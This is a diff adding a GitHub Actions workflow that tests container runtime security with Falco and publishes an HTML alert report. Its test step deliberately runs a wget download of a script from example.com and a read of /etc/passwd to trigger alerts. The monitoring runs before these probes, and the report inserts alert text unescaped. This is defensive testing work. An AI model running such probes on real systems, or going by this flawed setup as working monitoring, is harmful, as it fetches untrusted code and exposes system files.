@@ -1,0 +1,214 @@
+name: Runtime Container Security
+
+on:
+  push:
+    branches: [ main ]
+    paths:
+      - 'Dockerfile'
+      - 'docker-compose.yml'
+      - 'falco/**'
+      - 'scripts/runtime_security_monitor.py'
+  pull_request:
+    branches: [ main ]
+    paths:
+      - 'Dockerfile'
+      - 'docker-compose.yml'
+      - 'falco/**'
+      - 'scripts/runtime_security_monitor.py'
+  schedule:
+    - cron: '0 0 * * 3'  # Run weekly on Wednesdays at midnight
+  workflow_dispatch:  # Allow manual trigger
+
+jobs:
+  runtime-security-test:
+    name: Runtime Security Testing
+    runs-on: ubuntu-latest
+    
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+      
+      # Set up Python for security scripts
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.10'
+      
+      # Install dependencies
+      - name: Install dependencies
+        run: |
+          python -m pip install --upgrade pip
+          pip install -r requirements.txt
+      
+      # Install Falco for testing
+      - name: Install Falco
+        run: |
+          curl -s https://falco.org/repo/falcosecurity-packages.asc | apt-key add -
+          echo "deb https://download.falco.org/packages/deb stable main" | tee -a /etc/apt/sources.list.d/falcosecurity.list
+          apt-get update -y
+          apt-get install -y falco
+        env:
+          DEBIAN_FRONTEND: noninteractive
+      
+      # Validate Falco rules
+      - name: Validate Falco rules
+        run: |
+          echo "Validating Falco rules..."
+          falco -L -r falco/falco_rules.yaml
+      
+      # Build and start the application container
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v2
+      
+      - name: Build and run application container
+        run: |
+          docker-compose build security-app
+          docker-compose up -d security-app
+      
+      # Run security tests (using runtime security tools)
+      - name: Run Runtime Security Tests
+        run: |
+          mkdir -p test-results
+          
+          # Run Falco and monitor for 30 seconds
+          mkdir -p falco/logs
+          timeout 30s falco -c falco/falco.yaml -r falco/falco_rules.yaml -o json_output=true > falco/logs/test_run.log
+          
+          # Process and analyze Falco alerts
+          python scripts/runtime_security_monitor.py --log-file falco/logs/test_run.log --dashboard-url http://localhost:8080 | tee test-results/runtime_security.log
+          
+          # Run security tests that intentionally trigger alerts
+          echo "Running security test scenarios..."
+          docker exec security-app sh -c "cd /tmp && wget https://example.com/test.sh" || true
+          docker exec security-app sh -c "apt-get update" || true
+          docker exec security-app sh -c "cat /etc/passwd" || true
+          
+          # Let Falco process the alerts
+          sleep 5
+      
+      # Check if critical issues were found
+      - name: Check for critical security issues
+        run: |
+          if grep -q "CRITICAL" falco/logs/test_run.log; then
+            echo "Critical security issues detected!"
+            grep "CRITICAL" falco/logs/test_run.log
+            exit 1
+          else
+            echo "No critical security issues detected."
+          fi
+      
+      # Generate report
+      - name: Generate security report
+        run: |
+          # Create a basic HTML report from the Falco logs
+          mkdir -p runtime-security-reports
+          python -c '
+          import json
+          import sys
+          import os
+          
+          alerts = []
+          try:
+              with open("falco/logs/test_run.log", "r") as f:
+                  for line in f:
+                      line = line.strip()
+                      if not line:
+                          continue
+                      try:
+                          alert = json.loads(line)
+                          alerts.append(alert)
+                      except json.JSONDecodeError:
+                          pass
+          except Exception as e:
+              print(f"Error processing log file: {str(e)}")
+          
+          # Group alerts by priority
+          alerts_by_priority = {}
+          for alert in alerts:
+              priority = alert.get("priority", "unknown")
+              if priority not in alerts_by_priority:
+                  alerts_by_priority[priority] = []
+              alerts_by_priority[priority].append(alert)
+          
+          # Generate HTML
+          with open("runtime-security-reports/index.html", "w") as f:
+              f.write("""
+              <!DOCTYPE html>
+              <html>
+              <head>
+                  <title>Runtime Security Report</title>
+                  <style>
+                      body { font-family: Arial, sans-serif; margin: 20px; }
+                      h1 { color: #333; }
+                      .alert { margin: 10px 0; padding: 10px; border-radius: 5px; }
+                      .critical { background-color: #f8d7da; border: 1px solid #f5c6cb; }
+                      .warning { background-color: #fff3cd; border: 1px solid #ffeeba; }
+                      .info { background-color: #d1ecf1; border: 1px solid #bee5eb; }
+                      .notice { background-color: #d6d8d9; border: 1px solid #c6c8ca; }
+                      .rule { font-weight: bold; }
+                      .output { margin-top: 5px; }
+                  </style>
+              </head>
+              <body>
+                  <h1>Runtime Container Security Report</h1>
+                  <p>Generated on: """ + os.popen("date").read() + """</p>
+                  <h2>Summary</h2>
+                  <ul>
+              """)
+              
+              # Add summary
+              for priority, priority_alerts in alerts_by_priority.items():
+                  f.write(f"<li><strong>{priority.title()}:</strong> {len(priority_alerts)} alerts</li>\n")
+              
+              # Add details for each priority
+              for priority, priority_alerts in alerts_by_priority.items():
+                  if not priority_alerts:
+                      continue
+                  
+                  f.write(f"<h2>{priority.title()} Alerts</h2>\n")
+                  
+                  for alert in priority_alerts:
+                      rule = alert.get("rule", "Unknown")
+                      output = alert.get("output", "No output")
+                      time = alert.get("time", "Unknown time")
+                      
+                      css_class = "info"
+                      if priority.lower() == "critical":
+                          css_class = "critical"
+                      elif priority.lower() == "warning":
+                          css_class = "warning"
+                      elif priority.lower() in ["notice", "debug"]:
+                          css_class = "notice"
+                      
+                      f.write(f"""
+                      <div class="alert {css_class}">
+                          <div class="rule">{rule}</div>
+                          <div class="time">Time: {time}</div>
+                          <div class="output">{output}</div>
+                      </div>
+                      """)
+              
+              f.write("""
+              </body>
+              </html>
+              """)
+          '
+      
+      # Archive results
+      - name: Archive security results
+        uses: actions/upload-artifact@v3
+        with:
+          name: runtime-security-results
+          path: |
+            falco/logs/
+            test-results/
+            runtime-security-reports/
+      
+      # Deploy the report to GitHub Pages
+      - name: Deploy Runtime Security Report to GitHub Pages
+        if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+        uses: JamesIves/github-pages-deploy-action@v4
+        with:
+          folder: runtime-security-reports
+          branch: gh-pages
+          target-folder: runtime-security-reports 
